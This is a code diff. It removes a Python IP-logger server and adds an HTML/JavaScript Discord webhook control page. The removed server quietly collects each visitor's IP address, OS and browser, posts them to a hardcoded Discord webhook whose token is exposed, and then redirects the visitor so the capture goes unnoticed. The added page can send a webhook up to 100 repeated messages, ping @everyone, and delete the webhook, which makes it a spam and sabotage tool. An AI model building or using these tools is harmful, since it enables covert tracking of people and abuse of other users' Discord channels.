@@ -1,67 +1,273 @@
-from http.server import BaseHTTPRequestHandler, HTTPServer
-import requests
-import httpagentparser
-from urllib import parse
-import json
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
 
-# إعدادات السيرفر
-HOST = "0.0.0.0"  # تشغيل السيرفر على جميع الواجهات
-PORT = 8080  # المنفذ الذي يعمل عليه السيرفر
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webhook Client Discord</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
 
-# رابط Webhook الخاص بـ Discord (استبدله برابطك)
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334788763901231135/TYM4Pqjma73Z7urVGufGYqm_4j6jbwLrtvdqBIZcbt4tgFoS_K-SPCdEwjRDUUW2IaS2"
+        html, body {
+            width: 100%;
+            height: 100%;
+            text-align: center;
+            direction: rtl;
+            background: url('https://i.pinimg.com/originals/35/58/0d/35580d64b9b883fd0e0678595fc2aefd.gif') no-repeat center center fixed;
+            background-size: 100% 100%;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-# رابط الصورة الافتراضية (يمكنك استبداله)
-DEFAULT_IMAGE_URL = "https://previews.123rf.com/images/nobilior/nobilior1412/nobilior141200028/34908808-nice-female-ass-white-background-isolated.jpg"
+        .container {
+            width: 400px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 12px;
+            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
 
-# رابط الموقع الذي سيتم تحويل المستخدم إليه
-REDIRECT_URL = "https://www.youtube.com/"  # استبدله بأي رابط تريد
+        h1 {
+            margin-bottom: 15px;
+            font-size: 22px;
+            background: linear-gradient(90deg, #FFD700, #ffcc00, #FFD700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
 
-class RedirectHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        try:
-            # استخراج عنوان IP الخاص بالزائر
-            ip = self.client_address[0]
-            
-            # استخراج بيانات المتصفح ونظام التشغيل
-            user_agent = self.headers.get("User-Agent", "Unknown")
-            os, browser = httpagentparser.simple_detect(user_agent)
+        input, select {
+            width: 100%;
+            margin: 8px 0;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: none;
+            outline: none;
+        }
 
-            # إرسال البيانات إلى Discord Webhook
-            discord_payload = {
-                "username": "Visitor Logger",
-                "embeds": [
-                    {
-                        "title": "🚀 زيارة جديدة",
-                        "color": 3447003,
-                        "fields": [
-                            {"name": "📌 IP", "value": ip, "inline": False},
-                            {"name": "🖥 OS", "value": os, "inline": True},
-                            {"name": "🌐 Browser", "value": browser, "inline": True},
-                            {"name": "🔗 User-Agent", "value": user_agent, "inline": False},
-                            {"name": "🖼 Image Opened", "value": DEFAULT_IMAGE_URL, "inline": False}
-                        ]
-                    }
-                ]
+        select {
+            background-color: black;
+            color: white;
+            border: 2px solid white;
+            cursor: pointer;
+        }
+
+        select option {
+            background-color: black;
+            color: white;
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 5px 0;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .delete-btn {
+            background-color: black ;
+            color: white;
+        }
+
+        .send-btn {
+            background-color: blue;
+            color: white;
+        }
+
+        .mention-btn {
+            background-color: blue;
+            color: black;
+        }
+
+        button:hover {
+            opacity: 0.8;
+        }
+
+        #file-upload {
+            display: none;
+        }
+
+        .upload-label {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            border: 2px dashed rgba(255, 255, 255, 0.5);
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .success {
+            color: green;
+            font-size: 16px;
+        }
+
+        .error {
+            color: red;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>إدارة ويبهوك Discord</h1>
+        <input type="text" id="webhook-url" placeholder="Webhook">
+        <input type="text" id="username" placeholder="Username">
+        <input type="text" id="avatar-url" placeholder="Avatar">
+        <input type="text" id="message" placeholder="Message">
+        
+        <label for="message-count">🔢 Amount of messages </label>
+        <select id="message-count">
+            <option value="1">1</option>
+            <option value="5">5</option>
+            <option value="10">10</option>
+            <option value="50">50</option>
+            <option value="100">100</option>
+        </select>
+
+        <label for="file-upload" class="upload-label">Upload a File </label>
+        <input type="file" id="file-upload" accept="image/*,video/*,audio/*,application/pdf">
+        <p id="file-name">No file seleced yet </p>
+
+        <button class="send-btn" onclick="sendMessage()">Sent a message/button>
+        <button class="mention-btn" onclick="mentionEveryone()">Notify All mebers </button>
+        <button class="delete-btn" onclick="deleteWebhook()">Delete the Webhook </button>
+
+        <p id="status"></p>
+    </div>
+
+    <script>
+        let selectedFile = null;
+
+        document.getElementById("file-upload").addEventListener("change", function(event) {
+            selectedFile = event.target.files[0];
+
+            if (selectedFile) {
+                if (selectedFile.size > 8 * 1024 * 1024) { // 8MB limit
+                    alert("File size is too big please use a file less than 8MB .");
+                    selectedFile = null;
+                } else {
+                    document.getElementById("file-name").textContent = selectedFile.name;
+                }
+            } else {
+                document.getElementById("file-name").textContent = "No File Selected Yet ";
             }
-            requests.post(DISCORD_WEBHOOK_URL, json=discord_payload)
+        });
 
-            # إعادة توجيه المستخدم إلى الموقع المحدد
-            self.send_response(302)  # 302 = Found (Redirect)
-            self.send_header("Location", REDIRECT_URL)  # إعادة توجيه إلى الموقع
-            self.end_headers()
+        async function sendMessage() {
+            let webhookURL = document.getElementById("webhook-url").value;
+            let message = document.getElementById("message").value;
+            let username = document.getElementById("username").value;
+            let avatarURL = document.getElementById("avatar-url").value;
+            let messageCount = parseInt(document.getElementById("message-count").value);
 
-        except Exception as e:
-            print("Error:", e)
-            self.send_response(500)
-            self.end_headers()
-            self.wfile.write(b"500 - Internal Server Error")
+            if (!webhookURL.startsWith("https://discord.com/api/webhooks/") || !message) {
+                document.getElementById("status").textContent = "You Entered A Wrong Webhook.";
+                document.getElementById("status").className = "error";
+                return;
+            }
 
-# تشغيل السيرفر
-if __name__ == "__main__":
-    server = HTTPServer((HOST, PORT), RedirectHandler)
-    print(f"✅ Server running on http://{HOST}:{PORT}")
-    server.serve_forever() 
+            let formData = new FormData();
+            formData.append("content", message);
+            formData.append("username", username || "Bot");
+            formData.append("avatar_url", avatarURL || "");
+
+            if (selectedFile) {
+                let fileType = selectedFile.type;
+                if (fileType.startsWith("image/")) {
+                    formData.append("file", selectedFile);
+                } else {
+                    alert(" You only can Upload an image or an GIF !");
+                    return;
+                }
+            }
+
+            for (let i = 0; i < messageCount; i++) {
+                try {
+                    let response = await fetch(webhookURL, { method: "POST", body: formData });
+
+                    if (response.ok) {
+                        console.log(`Message Sented successfully  ${i + 1}`);
+                    } else {
+                        throw new Error("Error");
+                    }
+
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                } catch (error) {
+                    document.getElementById("status").textContent = `Error : ${error.message}`;
+                    document.getElementById("status").className = "error";
+                    return;
+                }
+            }
+
+            document.getElementById("status").textContent = ` ${messageCount}Sented successfully !`;
+            document.getElementById("status").className = "success";
+        }
+
+        function mentionEveryone() {
+            let webhookURL = document.getElementById("webhook-url").value;
+            let message = document.getElementById("message").value;
+            let username = document.getElementById("username").value;
+            let avatarURL = document.getElementById("avatar-url").value;
+
+            if (!webhookURL.startsWith("https://discord.com/api/webhooks/")) {
+                alert("You Entered a Wronge Webhook!");
+                return;
+            }
+
+            let mentionedMessage = "@everyone " + message;
+            let formData = new FormData();
+            formData.append("content", mentionedMessage);
+            formData.append("username", username || "Bot");
+            formData.append("avatar_url", avatarURL || "");
+
+            fetch(webhookURL, { method: "POST", body: formData })
+                .then(response => {
+                    if (response.ok) {
+                        document.getElementById("status").textContent = " Evreyone!";
+                        document.getElementById("status").className = "success";
+                    } else {
+                        alert("Error");
+                    }
+                })
+                .catch(error => alert("Error  : " + error));
+        }
+
+        function deleteWebhook() {
+            let webhookURL = document.getElementById("webhook-url").value;
+            if (!webhookURL.startsWith("https://discord.com/api/webhooks/")) {
+                alert("You Entered a Wronge Webhook!");
+                return;
+            }
+
+            fetch(webhookURL, {
+                method: "DELETE"
+            }).then(response => {
+                if (response.status === 204) {
+                    alert("Webhook Deleted successfully!");
+                } else {
+                    alert("Error!");
+                }
+            }).catch(error => alert("Error: " + error));
+        }
+    </script>
+</body>
+</html>
